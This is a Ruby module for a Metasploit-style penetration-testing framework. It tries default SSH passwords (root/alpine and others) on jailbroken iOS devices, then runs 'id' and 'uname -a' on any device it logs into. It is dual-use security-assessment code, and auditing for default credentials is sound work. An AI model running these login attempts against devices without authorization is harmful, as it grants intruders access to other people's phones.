# frozen_string_literal: true

require 'net/ssh'
require 'timeout'
require_relative '../../lib/apex_module'

module ApexFramework
  module Modules
    class CydiaDefaultSSH < ApexModule

      info(
        name:            'Apple iOS Default SSH Credential Check',
        category:        'ssh',
        rank:            'excellent',
        description:     'Validates default credentials on jailbroken iOS devices ' \
                         '(root/alpine, mobile/dottie, mobile/alpine). Targets devices ' \
                         'with Cydia/OpenSSH where passwords remain unchanged.',
        authors:         ['hdm'],
        references:      [{ type: 'OSVDB', id: '61284' }],
        disclosure_date: '2007-07-02',
        platform:        'unix',
        arch:            'cmd'
      )

      register_option :RHOST,       type: :string,  required: true,  description: 'Target host address'
      register_option :RPORT,       type: :port,    required: true,  default: 22,    description: 'SSH port'
      register_option :SSH_TIMEOUT, type: :integer, required: false, default: 30,    description: 'SSH negotiation timeout (seconds)'
      register_option :SSH_DEBUG,   type: :boolean, required: false, default: false, description: 'Enable verbose SSH debug output'

      ACCOUNTS = [
        { user: 'root',   pass: 'alpine' },
        { user: 'mobile', pass: 'dottie' },
        { user: 'mobile', pass: 'alpine' }
      ].freeze

      def run
        ACCOUNTS.each do |cred|
          user = cred[:user]
          pass = cred[:pass]

          log_status "#{authority} — Attempting login as '#{user}' with password '#{pass}'"

          session = attempt_login(user, pass)
          next unless session

          log_good "#{authority} — Login successful (#{user}:#{pass})"
          handle_session(session, user)
          return
        end

        log_error "#{authority} — All credential pairs exhausted. No valid login found."
      end

      private

      def authority
        "#{get(:RHOST)}:#{get(:RPORT)}"
      end

      def attempt_login(user, pass)
        timeout_val = get(:SSH_TIMEOUT)

        opts = {
          port:             get(:RPORT),
          password:         pass,
          auth_methods:     ['password', 'keyboard-interactive'],
          non_interactive:  true,
          timeout:          timeout_val,
          verify_host_key:  :never
        }

        opts[:verbose] = :debug if get(:SSH_DEBUG)

        ssh = nil
        Timeout.timeout(timeout_val) do
          ssh = Net::SSH.start(get(:RHOST), user, opts)
        end

        ssh
      rescue Net::SSH::AuthenticationFailed
        log_error "#{authority} — Authentication failed for #{user}"
        nil
      rescue Net::SSH::Disconnect, EOFError
        log_error "#{authority} — Disconnected during negotiation"
        nil
      rescue Timeout::Error
        log_error "#{authority} — Timed out during negotiation"
        nil
      rescue Errno::ECONNREFUSED
        log_error "#{authority} — Connection refused"
        nil
      rescue Errno::EHOSTUNREACH
        log_error "#{authority} — Host unreachable"
        nil
      rescue SocketError => e
        log_error "#{authority} — Socket error: #{e.message}"
        nil
      rescue StandardError => e
        log_error "#{authority} — SSH error (#{e.class}): #{e.message}"
        nil
      end

      def handle_session(ssh, user)
        log_good "#{authority} — Interactive session opened as '#{user}'"

        output = ssh_exec(ssh, 'id')
        log_status "#{authority} — Remote identity: #{output.strip}" if output

        output = ssh_exec(ssh, 'uname -a')
        log_status "#{authority} — System: #{output.strip}" if output

        log_status "#{authority} — Session validated. Closing connection."
        ssh.close
      rescue StandardError => e
        log_error "#{authority} — Session handling error: #{e.message}"
        ssh&.close
      end

      def ssh_exec(ssh, command)
        result = ''
        ssh.exec!(command) do |_ch, stream, data|
          result += data if stream == :stdout
        end
        result.empty? ? nil : result
      rescue StandardError => e
        log_debug "Command '#{command}' failed: #{e.message}"
        nil
      end
    end
  end
end

ApexFramework::ApexModule.register_module(
  'ssh/cydia_default_ssh',
  ApexFramework::Modules::CydiaDefaultSSH
)
